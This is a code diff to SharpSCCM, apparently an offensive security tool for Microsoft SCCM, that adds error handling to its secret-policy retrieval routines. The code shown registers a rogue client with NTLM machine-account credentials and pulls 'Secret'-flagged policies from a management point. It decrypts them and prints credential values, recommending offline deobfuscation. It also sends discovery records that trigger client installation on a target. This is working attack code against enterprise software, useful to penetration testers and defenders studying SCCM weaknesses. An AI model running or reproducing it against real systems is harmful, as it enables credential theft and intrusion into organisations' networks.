@@ -107,7 +107,16 @@ namespace SharpSCCM
                 if (Helpers.IsHighIntegrity())
                 {
                     (signingCertificate, encryptionCertificate) = (LocalSmsSigningCertificate(), LocalSmsEncryptionCertificate());
-                    clientId = ClientWmi.GetSmsId();
+                    if (signingCertificate != null && encryptionCertificate != null)
+                    {
+                        clientId = ClientWmi.GetSmsId();
+                    }
+                    else
+                    {
+                        Console.WriteLine("[!] The SCCM client may not be installed on this machine");
+                        Console.WriteLine("[!] Try registering a new device to obtain a client GUID and reusable certificate");
+                        return (signingCertificate, encryptionCertificate, clientId);
+                    }
                 }
                 else
                 {
@@ -134,93 +143,114 @@ namespace SharpSCCM
             // Register a new client using NTLM authentication for the specified machine account to automatically approve the new device record, allowing secret policy retrieval
 
             (MessageCertificateX509 signingCertificate, MessageCertificateX509 encryptionCertificate, SmsClientId clientId) = GetCertsAndClientId(managementPoint, siteCode, encodedCertificate, providedClientId, username, password, registerClient);
-            
-            // Send request for policy assignments to obtain policy locations
-            ConfigMgrPolicyAssignmentReply assignmentReply = SendPolicyAssignmentRequest(clientId, signingCertificate, managementPoint, siteCode);
 
-            // Get secret policies
-            string outputFull = "";
-            string outputCreds = "";
-            foreach (PolicyAssignment policyAssignment in assignmentReply.ReplyAssignments.PolicyAssignments)
+            if (signingCertificate != null && encryptionCertificate != null && clientId != null)
             {
-                if (policyAssignment.Policy.Flags.ToString().Contains("Secret"))
-                {
-                    Console.WriteLine("[+] Found policy containing secrets:");
-                    Console.WriteLine($"      ID: {policyAssignment.Policy.Id}");
-                    Console.WriteLine($"      Flags: {policyAssignment.Policy.Flags}");
-                    Console.WriteLine($"      URL: {policyAssignment.Policy.Location.Value}");
+                // Send request for policy assignments to obtain policy locations
+                ConfigMgrPolicyAssignmentReply assignmentReply = SendPolicyAssignmentRequest(clientId, signingCertificate, managementPoint, siteCode);
 
-                    // Can't figure out how to authenticate with the SDK so using raw HTTP requests
-                    string policyURL = policyAssignment.Policy.Location.Value.Replace("<mp>", managementPoint);
-                    HttpResponseMessage policyDownloadResponse = SendPolicyDownloadRequest(policyURL, clientId.ToString(), encryptionCertificate);
-                    byte[] policyDownloadResponseBytes = await policyDownloadResponse.Content.ReadAsByteArrayAsync();
-                    Console.WriteLine($"[+] Received encoded response from server for policy {policyAssignment.Policy.Id}");
-                    string decryptedPolicyBody = DecryptPolicyBody(policyDownloadResponseBytes, encryptionCertificate);
-                    if (decryptedPolicyBody != null)
+                // Get secret policies
+                string outputFull = "";
+                string outputCreds = "";
+                foreach (PolicyAssignment policyAssignment in assignmentReply.ReplyAssignments.PolicyAssignments)
+                {
+                    if (policyAssignment.Policy.Flags.ToString().Contains("Secret"))
                     {
-                        outputFull += decryptedPolicyBody;
-                        XmlDocument policyXmlDoc = new XmlDocument();
-                        policyXmlDoc.LoadXml(decryptedPolicyBody.Trim().Remove(0, 2));
-                        XmlNodeList propertyNodeList = policyXmlDoc.GetElementsByTagName("property");
-                        foreach (XmlNode propertyNode in propertyNodeList)
+                        Console.WriteLine("[+] Found policy containing secrets:");
+                        Console.WriteLine($"      ID: {policyAssignment.Policy.Id}");
+                        Console.WriteLine($"      Flags: {policyAssignment.Policy.Flags}");
+                        Console.WriteLine($"      URL: {policyAssignment.Policy.Location.Value}");
+
+                        // Can't figure out how to authenticate with the SDK so using raw HTTP requests
+                        string policyURL = policyAssignment.Policy.Location.Value.Replace("<mp>", managementPoint);
+                        HttpResponseMessage policyDownloadResponse = SendPolicyDownloadRequest(policyURL, clientId.ToString(), encryptionCertificate);
+                        byte[] policyDownloadResponseBytes = await policyDownloadResponse.Content.ReadAsByteArrayAsync();
+                        Console.WriteLine($"[+] Received encoded response from server for policy {policyAssignment.Policy.Id}");
+                        string decryptedPolicyBody = DecryptPolicyBody(policyDownloadResponseBytes, encryptionCertificate);
+                        if (decryptedPolicyBody != null)
                         {
-                            if (propertyNode.Attributes["secret"] != null)
+                            outputFull += decryptedPolicyBody;
+                            XmlDocument policyXmlDoc = new XmlDocument();
+                            policyXmlDoc.LoadXml(decryptedPolicyBody.Trim().Remove(0, 2));
+                            XmlNodeList propertyNodeList = policyXmlDoc.GetElementsByTagName("property");
+                            foreach (XmlNode propertyNode in propertyNodeList)
                             {
-                                outputCreds += $"{propertyNode.Attributes["name"].Value}: {propertyNode.InnerText.Trim()}\n\n";
+                                if (propertyNode.Attributes["secret"] != null)
+                                {
+                                    outputCreds += $"{propertyNode.Attributes["name"].Value}: {propertyNode.InnerText.Trim()}\n\n";
+                                }
                             }
                         }
+
+                        /*
+                        // Code borrowed from SetCustomHeader method, exception on Decrypt method
+                        ConfigMgrPolicyBodyDownloadRequest policyDownloadRequest = new ConfigMgrPolicyBodyDownloadRequest(assignmentReply, policyAssignment);
+                        Dictionary<string, object> senderProperty = (Dictionary<string, object>)policyDownloadRequest.Settings.SenderProperties["HttpSender", "HttpHeaders"];
+                        string clientTokenHeader = $"{clientId};{TimeHelpers.CurrentTimeAsIso8601};2";
+                        senderProperty["ClientToken"] = clientTokenHeader;
+                        senderProperty["ClientTokenSignature"] = certificate.Sign(clientTokenHeader + "\0", MessageCertificateSigningOptions.CryptNoHashId).HexBinaryEncode().ToUpperInvariant();
+                        policyDownloadRequest.DownloadSecrets = true;
+                        ConfigMgrPolicyBodyDownloadReply policyBodyDownloadReply = policyDownloadRequest.SendMessage(sender);
+                        */
                     }
-
-                    /*
-                    // Code borrowed from SetCustomHeader method, exception on Decrypt method
-                    ConfigMgrPolicyBodyDownloadRequest policyDownloadRequest = new ConfigMgrPolicyBodyDownloadRequest(assignmentReply, policyAssignment);
-                    Dictionary<string, object> senderProperty = (Dictionary<string, object>)policyDownloadRequest.Settings.SenderProperties["HttpSender", "HttpHeaders"];
-                    string clientTokenHeader = $"{clientId};{TimeHelpers.CurrentTimeAsIso8601};2";
-                    senderProperty["ClientToken"] = clientTokenHeader;
-                    senderProperty["ClientTokenSignature"] = certificate.Sign(clientTokenHeader + "\0", MessageCertificateSigningOptions.CryptNoHashId).HexBinaryEncode().ToUpperInvariant();
-                    policyDownloadRequest.DownloadSecrets = true;
-                    ConfigMgrPolicyBodyDownloadReply policyBodyDownloadReply = policyDownloadRequest.SendMessage(sender);
-                    */
                 }
-            }
 
-            if (!string.IsNullOrEmpty(outputPath))
-            {
-                File.WriteAllText(outputPath, outputFull);
-                Console.WriteLine($"[+] Wrote secret policies to {outputPath}");
-            }
+                if (!string.IsNullOrEmpty(outputPath))
+                {
+                    File.WriteAllText(outputPath, outputFull);
+                    Console.WriteLine($"[+] Wrote secret policies to {outputPath}");
+                }
 
-            if (!string.IsNullOrEmpty(outputCreds))
-            {
-                Console.WriteLine($"[+] Encrypted secrets:\n\n{outputCreds.TrimEnd()}\n");
-                // Thanks to Evan McBroom for reversing and writing this decryption routine! https://gist.github.com/EvanMcBroom/525d84b86f99c7a4eeb4e3495cffcbf0
-                Console.WriteLine("[+] Done! Encrypted hex strings can be decrypted offline using the \"DeobfuscateSecretString.exe <string>\" command");
-            }
-            else
-            {
-                Console.WriteLine($"[+] No secret policies were found, which could result from using an unapproved device for policy retrieval\n" +
-                    "[+] Try creating a new approved device by specifying a computer account (-u) and password (-p)");
+                if (!string.IsNullOrEmpty(outputCreds))
+                {
+                    Console.WriteLine($"[+] Encrypted secrets:\n\n{outputCreds.TrimEnd()}\n");
+                    // Thanks to Evan McBroom for reversing and writing this decryption routine! https://gist.github.com/EvanMcBroom/525d84b86f99c7a4eeb4e3495cffcbf0
+                    Console.WriteLine("[+] Encrypted hex strings can be decrypted offline using the \"DeobfuscateSecretString.exe <string>\" command");
+                }
+                else
+                {
+                    Console.WriteLine($"[+] No secret policies were found, which could result from using an unapproved device for policy retrieval\n" +
+                        "[+] Try creating a new approved device by specifying a computer account (-u) and password (-p)");
+                }
             }
         }
 
         public static MessageCertificateX509 LocalSmsEncryptionCertificate()
         {
+            MessageCertificateX509 certificate = null;
             // Get encryption certificate used by the legitimate client when PKI is not in use
-            MessageCertificateX509 certificate = MessageCertificateX509File.Find(StoreLocation.LocalMachine, "SMS", X509FindType.FindByApplicationPolicy, "1.3.6.1.4.1.311.101.2", false);
-            Console.WriteLine("[+] Obtained SMS Encryption Certificate from local computer certificates store");
+            try
+            {
+                certificate = MessageCertificateX509File.Find(StoreLocation.LocalMachine, "SMS", X509FindType.FindByApplicationPolicy, "1.3.6.1.4.1.311.101.2", false);
+                Console.WriteLine("[+] Obtained SMS Encryption Certificate from local computer certificates store");
+            }
+            catch (CryptographicException)
+            {
+                Console.WriteLine($"[!] Could not locate the SMS Encryption Certificate in the local computer certificates store");
+            }
             return certificate;
         }
 
         public static MessageCertificateX509 LocalSmsSigningCertificate()
         {
+
+            MessageCertificateX509 certificate = null;
             // Get signing certificate used by the legitimate client when PKI is not in use
-            MessageCertificateX509 certificate = MessageCertificateX509File.Find(StoreLocation.LocalMachine, "SMS", X509FindType.FindByApplicationPolicy, "1.3.6.1.4.1.311.101", false);
-            Console.WriteLine("[+] Obtained SMS Signing Certificate from local computer certificates store");
+            try
+            {
+                certificate = MessageCertificateX509File.Find(StoreLocation.LocalMachine, "SMS", X509FindType.FindByApplicationPolicy, "1.3.6.1.4.1.311.101", false);
+                Console.WriteLine("[+] Obtained SMS Signing Certificate from local computer certificates store");
+            }
+            catch (CryptographicException)
+            {
+                Console.WriteLine($"[!] Could not locate the SMS Signing Certificate in the local computer certificates store");
+            }
             return certificate;
         }
 
         public static SmsClientId RegisterClient(MessageCertificateX509 certificate, string target, string managementPoint, string siteCode, string authenticationType = null, string username = null, string password = null)
         {
+            SmsClientId clientId = null;
             HttpSender sender = new HttpSender();
             ConfigMgrRegistrationRequest registrationRequest = new ConfigMgrRegistrationRequest();
             // Add the certificate that will be tied to the new client ID for message signing and encryption
@@ -256,8 +286,15 @@ namespace SharpSCCM
             //Console.WriteLine($"\n[+] Registration Request Body:\n{System.Xml.Linq.XElement.Parse(registrationRequest.Body.ToString())}");
             // Register client and wait for a confirmation with the SmsId
             Console.WriteLine($"[+] Sending HTTP registration request to {registrationRequest.Settings.HostName}:{registrationRequest.Settings.HttpPort}");
-            SmsClientId clientId = registrationRequest.RegisterClient(sender, TimeSpan.FromMinutes(5));
-            Console.WriteLine($"[+] Received unique SMS client GUID for new device:\n\n    {clientId}\n");
+            try
+            {
+                clientId = registrationRequest.RegisterClient(sender, TimeSpan.FromMinutes(5));
+                Console.WriteLine($"[+] Received unique SMS client GUID for new device:\n\n    {clientId}\n");
+            }
+            catch (WebException ex)
+            {
+                Console.WriteLine($"[!] An exception occurred while contacting the management point: {ex.Message}");
+            }
             return clientId;
         }
 
@@ -329,7 +366,6 @@ namespace SharpSCCM
             ddrMessage.Settings.HostName = managementPoint;
             Console.WriteLine($"[+] Sending DDR from {ddrMessage.SmsId} to {ddrMessage.Settings.Endpoint} endpoint on {ddrMessage.Settings.HostName}:{ddrMessage.SiteCode} and requesting client installation on {target}");
             ddrMessage.SendMessage(sender);
-            Console.WriteLine("[+] Done!");
         }
 
         public static ConfigMgrContentLocationReply SendContentLocationRequest(string managementPoint, string siteCode, string packageId, int packageVersion, bool cert = false)
